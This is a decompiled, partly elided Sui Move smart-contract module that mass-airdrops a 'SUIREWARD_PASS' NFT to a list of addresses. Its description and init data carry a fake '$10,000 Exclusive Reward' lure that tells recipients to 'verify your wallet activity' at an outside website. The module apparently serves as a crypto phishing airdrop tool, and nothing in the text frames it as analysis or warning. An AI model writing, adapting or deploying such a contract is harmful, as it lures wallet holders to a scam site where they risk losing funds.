module 0xc105521a725f9a0b1a9bfb1ffe8b42458c9170e85c756acabe5e1b5cff3ce091::SUIREWARD_W {
    ...
    public entry fun AirdropReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = SUIREWARD_PASS{
                ...
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/suireward/2.jpg"),
                description : 0x1::string::utf8(b"$10,000 Exclusive Reward is ready at suireward.org. Verify your wallet activity and claim your reward."),
    ...
    fun init(arg0: SUIREWARD_W, arg1: &mut 0x2::tx_context::TxContext) {
        ...
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/suireward/2.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000 Exclusive Reward is ready at suireward.org. Verify your wallet activity and claim your reward."));
